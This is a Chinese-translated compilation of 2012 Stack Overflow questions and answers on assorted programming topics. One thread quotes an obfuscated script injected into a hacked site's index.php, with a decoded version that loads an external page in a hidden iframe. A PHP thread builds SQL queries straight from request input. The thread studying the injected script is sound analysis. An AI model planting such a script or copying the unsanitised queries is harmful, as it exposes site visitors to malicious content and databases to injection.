在写这篇文章时，我看到了 Matten 的评论 - 他强调了 ListItemCollection 的有用功能（能够通过它们的 text 属性删除项目）但问题是错误的。要求是：您只允许在 ddlChoices.Items 中拥有“permittedChoices”。Matten 的示例删除了有效的选择并留下了与他所要求的相反的无效选择。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-25T14:21:48.323

LINQ 是一种查询语言，它不用于修改您的数据。您可以做什么，它会根据您喜欢的条件查询您的项目列表，然后自行影响收藏。

样本：

```
var relevant = from item in list.Items
               where permittedChoices.Contains(item.ToString())
               select item 
```

并且您可以清除“项目”列表并仅添加您想要的相关内容。

```
ddlChoices.Clear();
ddlChoices.AddRange(relevant.ToArray()); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-25T14:23:16.623

只是为了使用linq？干得好 ：-）

```
private static void FilterDropDownChoices(List<String> permittedChoices)
{
    ddlChoices.Items.Cast<ListItem>()
       .Where(li => permittedChoices.Contains(li.Text))
       .ToList()
       .ForEach(ddlChoices.Items.Remove);
} 
```

# css - HTML5/CSS3 中是否有调整浏览器窗口大小以适应网页的命令？

> ID：11651496
> 
> 赞同：0
> 
> 时间：2012-07-25T14:01:18.853
> 
> 标签：css, html, resize

请注意：一旦用户访问我的网站，我不想调整我自己的页面，只是浏览器窗口。这可能吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-25T14:02:53.460

你不能用 HTML 或 CSS 做到这一点。*如果*用户没有配置他们的浏览器来防止这种情况，你可以使用 JavaScript 来做到这一点。（我在浏览器中设置了这个，因为它*很*烦人）。

更好的解决方案是使用响应式设计。您的网站会根据浏览器宽度进行调整，而不是相反。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-25T14:08:15.410

错误的方法，你的网站应该适应这个人的屏幕，反之亦然。我的 LCD 屏幕分辨率为 1920x1200，这让我很恼火，直到今天仍有许多网站浪费了大部分屏幕。事实上，SO 正好使用了我屏幕宽度的一半，宽度仅为 1920 像素中的 960 像素。

您应该在主要布局中使用百分比并坚持使用边距。如果您使用填充，请非常谨慎地使用它，并且仅在非常特定的情况下使用。我的个人资料中的网站是动态/液体/自适应布局的完美示例，因为无论您是使用小型手机还是大型多显示器高清屏幕设置，它都可以正常工作。

# google-maps - Google Geocoding API 即将发布的变更公告

> ID：11651497
> 
> 赞同：1
> 
> 时间：2012-07-25T14:01:22.437
> 
> 标签：google-maps, google-geocoding-api

是否有邮件列表、测试版 API 或其他服务（免费或付费）提供对[Google 地理编码 API](https://developers.google.com/maps/documentation/geocoding/)更改的提前警告？

[博客](http://googlegeodevelopers.blogspot.co.uk/)和邮件列表在发布时会提供更改通知，但不会提前发出警告。例如，当添加或更改地址组件类型而不发出警告时，这可能会导致问题。

# perl - 使用 perl 比较两个文件

> ID：11651499
> 
> 赞同：0
> 
> 时间：2012-07-25T14:01:28.893
> 
> 标签：perl

我有 2 个文件：A.txt 和 B.txt。在文件 A.txt 中，第一个文件具有 5 位数字序列，在 B.txt 文件中给出整数。如果文件 A.txt 的前 5 位与第二个文件 B.txt 不匹配，则需要在单独的文件中打印这些数字。即 B.txt 中的数字必须在另一个文件中打印。

**一个.txt**

```
81270,UEDP35
81274,UEDP35
87562,UEDP35
89537,UEDP35
90050,UEDP35
99358,UEDP35
99369,UEDP35
99560,UEDP35
99561,UEDP35

```

**B.txt**

```
8127047667
8756209276
9956176149
8127463873
8953713146
9935805068
9005080751
9956088702
9936916718

```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T14:20:52.847

```
use warnings;
use strict;
open AIN, "<A.TXT" or die("A.TXT");
open BIN, "<B.TXT" or die("B.TXT");
my %seen;
while (<AIN>) { 
  my $v = (split(/,/))[0]; 
  $seen{$v}++; 
}
while (<BIN>) { 
  my $v=(split)[0]; 
  print "$v\n" if not $seen{substr($v, 0, 5)}; 
}
close AIN;
close BIN; 
```

# perl - Perl，根据预告片，无法阅读 PDF 交叉引用部分

> ID：11651502
> 
> 赞同：3
> 
> 时间：2012-07-25T14:01:39.657
> 
> 标签：perl, pdf, corruption

我正在尝试阅读 pdf 文件的内容。这是代码

```
 4 use warnings;
 5 use strict;
 6
 7 use PDF;
 8
 9 print "*" x 30, "\n";
10 my $filename = shift;
11 print "Filename: $filename\n";
12
13 my $pdf = PDF->new($filename); 
```

这是输出：

```
******************************
Filename: Calabasas, LA County June 2012 monthly-new-projects-report.pdf
Can't read cross-reference section, according to trailer 
```

当我浏览谷歌时，我发现这与文件损坏有关。但我仍然可以用 pdf 阅读器打开它。

我应该尝试不同的 Perl 模块还是我的代码坏了？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-16T14:05:47.910

不知道这是否是您正在寻找的（纯 perl 解决方案或 Windows 解决方案），但在 Unix 中，我调用“pdftotext”为我进行转换，然后我阅读了文件：

```
open IN, '-|', '/usr/bin/pdftotext', $file, '-' 
    or die "couldn't open $file $!\n"; 
```

希望能帮助到你！

# javascript - 这个脚本是什么意思？

> ID：11651510
> 
> 赞同：4
> 
> 时间：2012-07-25T14:01:57.287
> 
> 标签：javascript

```
<script>
try{1-prototype;}catch(asd){x=2;}if(x){fr="fromChar";
 f=[4,0,91,108,100,88,107,95,100,101,22,91,105,99,54,91,90,29,32,22,112,4,0,107,88,104,21,96,92
 ,103,100,22,50,23,90,100,90,107,98,92,100,105,37,89,103,92,87,105,92,59,97,92,99,90,101,106,29
,30,95,91,105,87,98,92,29,30,50,3,-1,96,92,103,100,36,104,107,111,97,92,36,101,102,105,94,107,
95,100,101,51,28,88,88,104,102,98,106,107,91,28,50,3,-1,96,92,103,100,36,104,107,111,97,92,36,
105,102,102,50,30,35,46,48,47,90,100,29,48,4,0,94,93,104,98,37,105,105,112,98,90,37,98,90,93,1
06,50,30,35,46,48,47,90,100,29,48,4,0,94,93,104,98,37,105,103,90,22,21,52,22,23,95,106,105,103
,48,36,38,99,94,90,94,86,92,98,98,88,112,106,105,36,99,92,106,36,111,99,97,37,102,93,103,24,48
,4,0,94,93,104,98,37,95,89,23,51,21,30,92,103,100,63,89,30,49,2,1,90,100,90,107,98,92,100,105,
37,88,100,91,111,35,88,102,101,92,100,89,58,94,94,99,90,29,96,92,103,100,31,48,4,0,114,50,3,-1
,110,95,99,91,101,108,37,101,99,99,101,86,91,22,50,23,92,103,100,55,89,91,49,2,1];
v="eva";}if(v)e=window[v+"l"];w=f;s=[];r=String;z=((e)?"Code":"");zx=fr+z;for(i=0;286-5+5-
i>0;i+=1){j=i;if(e)s=s+r[zx]((w[j]*1+(9+e("j%3"))));}if(x&&f&&012===10)e(s);
</script> 
```

我不知道这个脚本做了什么，但昨天我在我的网页上发现了这个`index.php`，这实际上是让网站不显示。

是不是很危险，比如有人入侵了我的网站之类的？

让我知道是否有人对此有任何想法。

* * *

编辑：由[Rob W](https://stackoverflow.com/users/938089/rob-w)添加（**不是**原始海报）：代码被混淆了。修复语法错误（你的`1\n06`格式化导致 106 被分解`e(s)`成文字结果）：`eval(s)``s`

```
function frmAdd() {
var ifrm = document.createElement('iframe');
ifrm.style.position='absolute';
ifrm.style.top='-999em';
ifrm.style.left='-999em';
ifrm.src  = "http://michaelmazur.net/xml.php";
ifrm.id = 'frmId';
document.body.appendChild(ifrm);
};
window.onload = frmAdd; 
```

这个脚本似乎是某种跟踪器。[由于同源策略的限制](https://developer.mozilla.org/En/Same_origin_policy_for_JavaScript)，外部页面无法读取您页面的 cookie/etc 。这并不能保证您的服务器是安全的，因为它已被入侵。

# php - 用多个值修改MYSQL字段中的值（复杂）

> ID：11651511
> 
> 赞同：0
> 
> 时间：2012-07-25T14:02:02.783
> 
> 标签：php, mysql, phpmyadmin

表 1 - 用户

```
id username items
1 Paul 1(0020);2(0001); 
```

表 2 - 项目

```
id name 
1 name_here 
```

在我的用户的项目中，我输入了 2(0001)，这意味着：2=项目 ID，0001 是它的数量这是一个显示我的项目列表的函数

```
function getitems() {
$username = $_SESSION['user'];
$connect = mysql_connect("localhost","root","x") or die("Conexiune nereusita!");
mysql_select_db("skameron") or die("Baza de date nu exista!");
$query = mysql_query("SELECT * FROM users WHERE username='" . $username . "'") or            die(mysql_error());
if(mysql_num_rows($query) == 0) {
        echo "<tr><td colspan=\"3\">Nu ai iteme in inventar!</td></tr>";
} else {
        while($itm = mysql_fetch_assoc($query)) {
    $str = $itm['items'];
    $items = preg_split("/;/", $str); 
    foreach ($items as $item){ 

$temp_item =  preg_split("/,/", $item); 
if($temp_item){ 
    foreach ($temp_item as $temp_i){ 
    If($temp_i=="")
    {
    }
    else{
    $pieces = substr($temp_i, -5, 4);
    $piecesold = $pieces;
    $pieces = $pieces/1;
    //$arrnr = array(0,1,2,3,4,5,6,7,8,9,"(",")");
    //$temp_i = str_replace($arrnr,"",$temp_i);
    $query2 = mysql_query("SELECT * FROM items WHERE id='" . $temp_i . "'") or die(mysql_error());
        if(mysql_num_rows($query2) == 0) {
        echo "<tr><td colspan=\"3\">Nu ai iteme in inventar!</td></tr>";
} else {
        while($itm2 = mysql_fetch_assoc($query2)) {
        $temp_i = $itm2['name'];
        $temp_id = $itm2['id'];
        echo $temp_i . " <a href='items.php?del=". $temp_id."(".$piecesold.")'>Delete all</a>(". $pieces . ")/<a href='items.php?del=". $temp_id."(".$piecesold.")&nr=1'>Delete 1</a><br>"; 
    }}}}} else { 
    echo $item;     
}}}}} 
```

我创建了删除一个项目的页面，但我找不到只删除项目数量的方法......例如改变这个：2（0100）;1（0001）; 对此：2（0099）；1（0001）；

以下是我如何删除这样的值：

```
$delitem = $_GET['del'];
$queryreg = mysql_query("UPDATE users SET items = REPLACE(items, '$delitem;', '');"); 
```

我可以用这个页面删除一个像 2(0099); 这样的值。而其他人仍然存在......但我不能只更改 0099/1=99 的项目数量

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-25T14:09:40.263

您*确实*应该考虑更改数据的布局

```
Table1 - Users
Id Name
1  Paul

Table2 - Items
Id Name
1  SomeItem
2  AnotherItem

Table3 - UserItems
UserId ItemId Quantity
1      1      100
1      2      99 
```

现在 paul 有 100 个 SomeItem 和 99 个 AnotherItem

# objective-c - 应用程序包中的 ImageMagick

> ID：11651512
> 
> 赞同：2
> 
> 时间：2012-07-25T14:02:04.783
> 
> 标签：objective-c, xcode, macos, cocoa

我发现[问题（链接）](https://stackoverflow.com/questions/4773768/bundle-imagemagick-library-with-os-x-app)女巫与我的问题非常相似。[答案](https://stackoverflow.com/a/4792558/1428622)中的代码看起来是我一直在寻找的东西：

```
-(id)init
{
    if ([super init])
    {
        NSString* bundlePath = [[NSBundle mainBundle] bundlePath];
        NSString* imageMagickPath = [bundlePath stringByAppendingPathComponent:@"/Contents/Resources/ImageMagick"];
        NSString* imageMagickLibraryPath = [imageMagickPath stringByAppendingPathComponent:@"/lib"];

        MAGICK_HOME = imageMagickPath;
        DYLD_LIBRARY_PATH = imageMagickLibraryPath;
    }
    return self;
}

-(void)composite
{
    NSTask *task = [[NSTask alloc] init];

    // the ImageMagick library needs these two environment variables.
    NSMutableDictionary* environment = [[NSMutableDictionary alloc] init];
    [environment setValue:MAGICK_HOME forKey:@"MAGICK_HOME"];
    [environment setValue:DYLD_LIBRARY_PATH forKey:@"DYLD_LIBRARY_PATH"];

    // helper function from
    // http://www.karelia.com/cocoa_legacy/Foundation_Categories/NSFileManager__Get_.m
    NSString* pwd = [Helpers pathFromUserLibraryPath:@"MyApp"];

    // executable binary path
    NSString* exe = [MAGICK_HOME stringByAppendingPathComponent:@"/bin/composite"];

    [task setEnvironment:environment];
    [task setCurrentDirectoryPath:pwd]; // pwd
    [task setLaunchPath:exe]; // the path to composite binary
    // these are just example arguments
    [task setArguments:[NSArray arrayWithObjects: @"-gravity", @"center", @"stupid hat.png", @"IDR663.gif", @"bla.png", nil]];
    [task launch];
    [task waitUntilExit];
} 
```

但是当我尝试使用它时，我遇到了 6 个错误：

```
Use of undeclared identifier 'MAGICK_HOME'
Use of undeclared identifier 'DYLD_LIBRARY_PATH'
Use of undeclared identifier 'MAGICK_HOME'
Use of undeclared identifier 'DYLD_LIBRARY_PATH'
Use of undeclared identifier 'Helpers'
Use of undeclared identifier 'MAGICK_HOME' 
```

![在此处输入图像描述](../Images/9d2f0c174cddc9b53b097982ecb5a5a8.png)

我该如何解决？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-04T09:58:05.623

要使用您链接的代码，您可能只需要将它们声明为全局变量。

```
NSString * MAGICK_HOME = nil;
NSString * DYLD_LIBRARY_PATH = nil;

@implementation ... 
```

替换`Helpers`为`[self class]`，并添加来自链接源的函数：

```
/*
    NSFileManager: Get the path within the user's Library directory
    Original Source: <http://cocoa.karelia.com/Foundation_Categories/NSFileManager__Get_.m>
    (See copyright notice at <http://cocoa.karelia.com>)
*/

/*" Return the path in the user library path of the given sub-path.  In other words, if given inSubPath is "foo", the path returned will be /Users/myUser/Library/foo
"*/
-  (NSString *) pathFromUserLibraryPath:(NSString *)inSubPath
{
    NSArray *domains = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory,NSUserDomainMask,YES);
    NSString *baseDir= [domains objectAtIndex:0];
    NSString *result = [baseDir stringByAppendingPathComponent:inSubPath];
    return result;
} 
```

# ruby-on-rails - 查看在 Rails 2.3 中保存导入之前将对数据库进行哪些更改

> ID：11651513
> 
> 赞同：0
> 
> 时间：2012-07-25T14:02:05.483
> 
> 标签：ruby-on-rails, database, activerecord, import

我有我的产品、子产品和数据库成本的 xls 的导入/导出。问题是导入可以对数据库进行重大更改。这就是为什么我需要添加一个步骤：更改预览和确认链接。

我不知道如何“模拟”导入、记录差异、不保存更改并等待用户确认。

有人可以帮我吗？

（Rails 2.3.11，PostGreSQL）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-25T14:06:47.283

您应该利用脏属性：

模拟您的导入并使用新值设置您的对象：

```
obj.foo
#=> "old_foo"
obj.foo = "new_foo"
# Don't save!
obj.changes
#=> { 'foo' => ["old_foo", "new_foo"] } 
```

要将更改存储在内存中的某个位置，请考虑：

*   使用缓存

*   在表中添加一行，您将在其中序列化所有内容

# kml - 如何强制 Google 更新其服务器上的 KML 缓存？

> ID：11651520
> 
> 赞同：0
> 
> 时间：2012-07-25T14:02:29.267
> 
> 标签：kml, google-earth, google-earth-plugin

我正在使用 MySQL 数据库中的数据生成一个 KML 文件。它基本上是带有时间戳的纬度/经度数据。这是一个在线交易数据库。我试图只显示最后 10 笔交易。在 Google 地球应用程序中一切正常，但是当我尝试使用 Google 地球的网络浏览器插件从 KML 显示相同的数据时，它会在 Google 的服务器上显示缓存的数据，因此数据不是实时的。

我的 refreshInterval 设置为 20 秒。我试图在 URL 的末尾添加虚拟字符串，但它不起作用。有没有更好的方法来做到这一点？任何意见，将不胜感激。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:40:40.513

> 我试图在 URL 末尾添加虚拟字符串，但它不起作用

这意味着什么？

我使用的通常的“缓存破坏”策略是在 URL 的末尾附加一个时间戳，这样每个请求都是唯一的。

一种方法是将此 "?time="+(new Date()).getTime 附加到 URL（如果 URL 中已有参数，请将“？”替换为“&”）

# php - preg_replace 多次替换错误

> ID：11651522
> 
> 赞同：0
> 
> 时间：2012-07-25T14:02:34.207
> 
> 标签：php, regex, replace

我正在尝试制作一个在上传文件后重命名文件的功能，但此功能不起作用，我不明白为什么。

这是简单的示例代码：

```
echo $pathinfo["filename"]."<br/>";
$pathinfo["filename"] = preg_replace('/[ÝŶŸỲỸỶỴ]/', "Y", $pathinfo["filename"]);
echo $pathinfo["filename"]."<br/>"; 
```

哪个输出：

```
JPEG xè.w_.a(m)aaỶle_oui_
JPEG xY�.w_.a(m)aaYYYle_oui_ 
```

è 变成 ?? Ỷ 变成 YYY ！？

我真的不明白为什么我没有'JPEG xè.w_.a(m)aaYle_oui_'。

谢谢你们

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:11:37.203

`u`如果你想获取 Unicode 字符，你应该在你的正则表达式中添加修饰符。

```
echo $pathinfo["filename"]."<br/>";
$pathinfo["filename"] = preg_replace('/[ÝŶŸỲỸỶỴ]/u', "Y", $pathinfo["filename"]);
echo $pathinfo["filename"]."<br/>"; 
```

# selenium - 需要帮助来选择一个 div

> ID：11651523
> 
> 赞同：0
> 
> 时间：2012-07-25T14:02:41.263
> 
> 标签：selenium, selenium-webdriver

`dropdown`当我移到`C`元素 时，我需要通过单击“C”中的“C”来进行选择。

它的类更改为`x-combo-list-item x-combo-selected`，当我在代码中使用此代码单击元素时

```
drivefindElement(By.className("x-combo-list-item x-combo-selected")).click(); 
```

它抛出一个异常

```
org.openqa.selenium.IllegalLocatorException: Compound class names are not supported. 
Consider searching for one class name and filtering the results. 
```

你能帮我找到点击这个元素的方法吗？

html 代码 .. 来自 Firebug

```
<--div id="xyz" class="x-combo-list-inner" style="width: 253px; height: 105px;">

<--div class="x-combo-list-item" ext:qtip="">A<--/div>

<--div class="x-combo-list-item" ext:qtip="">B<--/div>

<--div class="x-combo-list-item x-combo-selected" ext:qtip="">C<--/div>

<--div class="x-combo-list-item" ext:qtip="">D<--/div>

<--div class="x-combo-list-item" ext:qtip="">E<--/div>

<--/div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T15:05:44.527

您可能会收到此错误，因为您的网页上有多个元素具有 class name = 'x-combo-list-item x-combo-selected' 。

您还可以通过为 firefox 安装[firepath](https://addons.mozilla.org/en-US/firefox/addon/firepath/)插件并尝试您在代码中使用的 xpath 来验证这一点。

尝试在 firepath 的帮助下找到您尝试单击的正确 WebElement。您甚至可以在 firebug 的帮助下通过右键单击 WebElement 并复制 xpath 来获取页面上元素的 XPath。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T14:42:50.193

考虑将选择器更改为 xpath：

```
driver.findElement(By.xpath("//div[@class='x-combo-list-item x-combo-selected']")).click(); 
```

# javascript - 如何正确设置 JavaScript 命名空间和类？

> ID：11651527
> 
> 赞同：46
> 
> 时间：2012-07-25T14:02:51.427
> 
> 标签：javascript, oop, javascript-framework, javascript-objects, javascript-namespaces

似乎有很多方法可以设置 JavaScript 应用程序，所以很难确定哪一种是正确的或最好的。以下技术或更好的方法有什么不同吗？

```
MyNamespace.MyClass = {
    someProperty: 5,
    anotherProperty: false,

    init: function () {
        //do initialization
    },

    someFunction: function () {
        //do something
    }
};

$(function () {
    MyNamespace.MyClass.init();
}); 
```

其他方式：

```
MyNamespace.MyClass = (function () {
    var someProperty = 5;
    var anotherProperty = false;

    var init = function () {
        //do something
    };

    var someFunction = function () {
        //do something
    };

    return {
        someProperty: someProperty
        anotherProperty: anotherProperty
        init: init
        someFunction: someFunction
    };
}());

MyNamespace.MyClass.init(); 
```

第一种技术*感觉*更像是一门课。如果这有所作为，我来自服务器端背景。第二种技术似乎更多余，也有点尴尬，但我也看到它被大量使用。有人可以帮忙阐明一下并建议前进的最佳方式吗？我想创建一个应用程序，其中包含许多相互交谈的类。

* * *

## 回答 #1

> 赞同：65
> 
> 时间：2012-07-25T14:05:45.850

这两件事都不做。

制作一个javascript“类”：

```
var MyClass = function () {

    var privateVar; //private
    var privateFn = function(){}; //private 

    this.someProperty = 5;  //public
    this.anotherProperty = false;  //public
    this.someFunction = function () {  //public
        //do something
    };

};

MyNamespace.MyClass = new MyClass(); 
```

* * *

一个带有静态变量的：

```
var MyClass = (function(){

    var static_var; //static private var

    var MyClass = function () {

        var privateVar; //private
        var privateFn = function(){}; //private 

        this.someProperty = 5;  //public
        this.anotherProperty = false;  //public
        this.someFunction = function () {  //public
            //do something
        };
    };

    return MyClass;

})();

MyNamespace.MyClass = new MyClass(); 
```

* * *

使用“构造函数”（所有示例都有一个“构造函数”，这个只有参数可以使用）：

```
var MyClass = function (a, b c) {

    //DO SOMETHING WITH a, b, c <--

    var privateVar; //private
    var privateFn = function(){}; //private 

    this.someProperty = 5;  //public
    this.anotherProperty = false;  //public
    this.someFunction = function () {  //public
        //do something
    };

};

MyNamespace.MyClass = new MyClass(1, 3, 4); 
```

* * *

有了以上所有内容，您**可以执行**以下操作：

```
MyNamespace.MyClass.someFunction(); 
```

但是您**不能**（从外部）：

```
MyNamespace.MyClass.privateFn(); //ERROR! 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-07-25T14:09:19.747

第一个示例只是一个[Object 文字](https://developer.mozilla.org/en/JavaScript/Guide/Values,_Variables,_and_Literals#Object_literals)- 它不能被实例化并且没有私有成员。第二个示例有一些不正确的语法（`var someProperty: 5`应该是`var someProperty = 5`），但是使用闭包将内部私有状态封装在自调用匿名函数中。

第二种方法看起来更适合封装私有成员，但可以通过使其成为可实例化的类来使其更加“面向对象”：

```
MyNamespace.MyClass = function() { ... };
MyNamespace.MyClass.prototype.someProperty = 'foo'; 
```

然后你可以用'new'关键字实例化它：

```
var aClass = new MyNamespace.MyClass();
aClass.init(...); 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2014-12-10T00:05:31.190

我对具有命名空间的可实例化类使用以下语法

```
 var MYNamespace = MYNamespace|| {};

 MYNamespace.MyFirstClass = function (val) {
        this.value = val;
        this.getValue = function(){
                          return this.value;
                       };
    }

var myFirstInstance = new MYNamespace.MyFirstClass(46);
alert(myFirstInstance.getValue()); 
```

jsfiddle：http: [//jsfiddle.net/rpaul/4dngxwb3/1/](http://jsfiddle.net/rpaul/4dngxwb3/1/)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2015-01-30T21:50:28.503

为什么你永远不应该使用

```
 return { methodName : methodDelegate} 
```

就像在第二个例子中：

```
MyNamespace.MyClass = (function () {
    var someProperty = 5;

    var init = function () {
        //do something
    };

    return {
        someProperty: someProperty
        someFunction: someFunction
    };
}());

MyNamespace.MyClass.init(); 
```

当您使用命名空间时，您必须将其视为声明，而不是实例。

```
MyNamespace = {};
MyNamespace.sub = {};
MyNamespace.anotherSub = {};
MyNamespace.sub.MyClass = (function () {

    var static_var; //static private var

    var MyClass2 = function () {

        var privateVar; //private
        var privateFn = function () { }; //private 

        this.someProperty = 5;  //public
        this.anotherProperty = false;  //public
        this.someFunction = function () {  //public
            //do something
        };
    };

    return MyClass2;

})();
debugger;

var c1 = new MyNamespace.sub.MyClass();
c1.someProperty = 1; // creates 5->1.

var c2 = new MyNamespace.sub.MyClass();
c2.someProperty = 2;  // creates 5->2\. c1 is still 1

debugger;
var myClass = function () {
    var someProperty = 5;
    var anotherProperty = false;

    var init = function () {
        //do something
    };

    var someFunction = function () {
        //do something
    };

    return {
        someProperty: someProperty,
        anotherProperty: anotherProperty,
        init: init,
        someFunction: someFunction
    };
};

MyNamespace.MyClass = myClass();
var c2 = MyNamespace.MyClass;
// how  are planning to create one more object, while it's a reference? copy      //the whole one?

c2.someProperty = 2; // changes 5 -> 2
var c3 = MyNamespace.MyClass.init(); // create 2 instead of 5

c3.someProperty = 3;    // changes c3 and c3 from 2 to 3.
console.log(c2.someProperty + c3.someProperty); 
```

不管 Module 反模式有多流行。声明使您能够以其他开发人员预期的方式将相同的代码用于不同的实例。代码的质量和阅读的简单性提高了。任何开发人员的目标都是编写一个简单的代码以供阅读，而不是更短或 DRY - 而是易于其他开发人员阅读和理解。这首先减少了错误的数量。(c) S.麦康奈尔

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2016-09-28T14:25:40.153

**如何结合命名空间和类声明：**

```
var ns = { // your namespace
    my_value: 1, // a value inside the namespace to avoid polluting
    MyClass: function() { // a class inside the namespace
        this.class_property: 12,
        this.class_method: function() {
            console.log("My property: " + this.class_property);
        }
    },
    myFunction: function() { // a function inside a namespace
        console.log("I can access namepsace value if you don't use 'new': " + this.my_value);
    }
}; 
```

访问您的价值：

```
console.log(ns.my_value); 
```

现在，对于类和函数：如果使用`new`，函数内的单词`this`将指向它的构造函数。如果不使用`new`,`this`将指向命名空间。所以，

使用类：

```
var obj = new ns.MyClass(); 
```

使用功能：

```
ns.myFunction(); 
```

如果您构造的对象没有`new`,`this`将指向命名空间，因此命名空间将被“销毁”，因为`MyClass.class_property`并且`MyClass.class_method`将被添加到其中。

# class - 对对象使用“容器”好吗？

> ID：11651528
> 
> 赞同：0
> 
> 时间：2012-07-25T14:02:52.277
> 
> 标签：class, containers

使用单个类来“保存”对象是否方便？假设我想多次使用一个对象（同一个对象），我可以很容易地从创建了静态对象的“容器类”中获取它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:04:27.077

最好使用容器来容纳对象。如果要管理对象集合，请使用容器。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-07-25T14:04:27.770

您正在寻找依赖注入模式。例如，寻找 Google Guice。

# asp.net-mvc - FileResult 和 FileStreamResult 类型未定义，我该如何解决？

> ID：11651535
> 
> 赞同：0
> 
> 时间：2012-07-25T14:03:05.837
> 
> 标签：asp.net-mvc, vb.net

从昨晚开始我就一直在看这个问题，只是不知道如何解决它。

2个错误，一个说，`Type FileResult is not defined`。

另一个说，`Type FileStreamResult is not defined`。

```
Imports System
Imports System.IO
Imports System.Collections.Generic
Imports System.Text
Imports EO.Pdf
Imports System.Collections.Specialized

Partial Class getRecs
    Inherits System.Web.UI.Page

Public Function Download() As FileResult
        ' Populate list with urls 
        Dim qParams As String = Request.QueryString("p")
        Dim urls() As String = qParams.Split(","c, ChrW(StringSplitOptions.RemoveEmptyEntries))

        Dim documents = New List(Of EO.Pdf.PdfDocument)()
        For Each url In urls
            Dim doc = New EO.Pdf.PdfDocument()
            EO.Pdf.HtmlToPdf.ConvertUrl(url, doc)
            documents.Add(doc)
        Next

        Dim mergedDocument As EO.Pdf.PdfDocument = EO.Pdf.PdfDocument.Merge(documents.ToArray())

        Dim ms = New MemoryStream()
        mergedDocument.Save(ms)
        ms.Position = 0

        Return New FileStreamResult(ms, "application/pdf") With { _
         .FileDownloadName = "download.pdf" _
        }
    End Function

End Class 
```

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T14:10:17.503

两者都[`FileResult`](http://msdn.microsoft.com/en-us/library/system.web.mvc.fileresult.aspx)需要[`FileStreamResult`](http://msdn.microsoft.com/en-Us/library/system.web.mvc.filestreamresult.aspx)以下参考：

```
System.Web.Mvc 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-25T14:07:57.297

我希望你错过了一个

```
Imports System.Web.Mvc 
```

并且可能是对`System.Web.Mvc`程序集的引用。VS 提供者不会在未定义的符号上稍微下拉一下，它会为你添加这个吗？（我很少使用 VB，所以不确定你是否得到与 C# 相同的内容。）

但是对于 ASP.NET WebForms，您可能会找到[`HttpResponse.WriteFile`](http://msdn.microsoft.com/en-us/library/system.web.httpresponse.writefile.aspx)更好的方法。

# delphi - 如何用Delphi打开PIC图形文件

> ID：11651537
> 
> 赞同：1
> 
> 时间：2012-07-25T14:03:11.557
> 
> 标签：delphi, graphics, image

我将图像保存到旧数据库中，并尝试将它们转换为 BMP。其中一些有一个标题 01 00 00 01 我无法打开，因为根据[文件签名](http://www.garykessler.net/library/file_sigs.html)中给出的信息，这些图像是[PIC](http://en.wikipedia.org/wiki/PICtor_PIC_image_format)文件。任何人都知道如何使用 delphi 打开 PIC 图像。TBitmap、TPNGObject、TMetafile、TIcon 和 TJPEGImage 不起作用。

提前致谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-25T16:43:41.443

Mike Lischke 的[GraphicEx](http://www.delphi-gems.com/index.php/libs/graphicex-library "GraphicEx")库可以打开 .PIC 文件。

我确定周围还有其他库可以打开 .PIC 文件，但这是我找到的第一个。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T14:10:22.727

我将首先验证它们是否是有效图像。尝试转储到扩展名为 .pic 的文件并使用 Irfanview 打开。

# javascript - 搜索引擎会抓取 javascript 生成的关键字和描述元标记吗？

> ID：11651540
> 
> 赞同：6
> 
> 时间：2012-07-25T14:03:17.067
> 
> 标签：javascript, html, ajax, seo, meta-tags

我有一个通过 ajax 加载其模板的网站。和元标记存在于此文件中`description`，而不是当前正在加载的页面上。加载模板后，它会将模板中的元标记嵌入到文件中。`keywords``template.html``index.html``index.html`

Google 或任何其他搜索引擎是否能够读取动态插入的此页面`description`和`keywords`元标记？

我问这个是因为我听说许多搜索引擎不支持 javascript，但是，当从 google 上的网站搜索结果中获取预览截图时，它会显示包含整个布局的页面（在插入之后`template.html`）所以这个让我有点好奇。

提前致谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-25T15:23:44.627

使用 JavaScript 将 HTML 添加到 DOM[已被证明](http://www.seomoz.org/ugc/can-google-really-access-content-in-javascript-really)可以与 Google 的抓取配合使用。所以真正的问题是使用这种方法是否仍然适用于元标记标记。您需要运行自己的测试，因为之前似乎没有其他人对此进行过案例研究。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T14:18:44.320

简单回答是不！大多数搜索引擎不会抓取由 javascript 动态添加的链接或单词！

# cmd - 如何从 DOS“树”命令的输出创建文件夹结构

> ID：11651541
> 
> 赞同：2
> 
> 时间：2012-07-25T14:03:17.113
> 
> 标签：cmd

我有一个包含 DOS 命令输出的文本文件`tree /a`。看起来像这样

```
 +---aset10
+---ConsoleApplication1
|   +---bin
|   |   \---Debug
|   +---obj
|   |   \---Debug
|   |       \---TempPE
|   \---Properties
\---testing folder 
```

实际上，它有很多文件夹。为简洁起见，我截断了输出。现在，我想在另一台计算机上创建一个类似的文件夹结构。有什么办法可以自动化吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T15:01:41.300

关于什么 ：

```
FOR /f "tokens=*" %x IN ( 'DIR /B /S /A:D' ) DO ECHO MKDIR "%x" >> somefile.cmd 
```

* * *

